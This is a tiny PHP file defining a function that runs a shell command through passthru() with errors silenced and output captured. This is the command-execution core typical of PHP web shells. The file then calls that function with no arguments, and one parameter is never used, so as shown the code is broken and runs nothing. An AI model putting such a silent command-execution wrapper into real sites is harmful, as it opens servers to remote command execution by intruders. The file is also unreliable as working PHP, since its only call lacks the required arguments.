<?php
function do_phpfun($cmd,$fun) {
	$res = '';
	@ob_start();	
	@passthru($cmd); 
	$res = @ob_get_contents();	
	@ob_end_clean();
	return $res;
}

call_user_func('do_phpfun');
?>